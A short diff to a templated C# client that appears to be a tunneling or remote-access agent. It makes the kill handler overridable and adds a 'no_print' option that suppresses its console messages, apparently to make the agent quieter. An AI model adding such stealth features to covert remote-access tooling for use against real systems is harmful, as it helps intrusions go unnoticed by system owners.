@@ -117,12 +117,14 @@ namespace ServiceClient
             }
         }
 
-        protected void HandleCheckout()
+        protected virtual void HandleCheckout()
         {
             {% if exit_on_close %}
             Environment.Exit(0);
             {% endif %}
+            {% if not no_print %}
             Console.WriteLine("[!] Kill signal received");
+            {% endif %}
             Killed = true;
 
             foreach (var forwarder in RemotePortForwarders.Values.ToArray())
@@ -378,7 +380,9 @@ namespace ServiceClient
             }
             catch (Exception ex)
             {
+                {% if not no_print %}
                 Console.WriteLine($"[!] Unhandled error: {ex}");
+                {% endif %}
                 if (!Killed)
                 {
                     await SendUpstreamMessageAsync(new InitiateTCPClientRep(
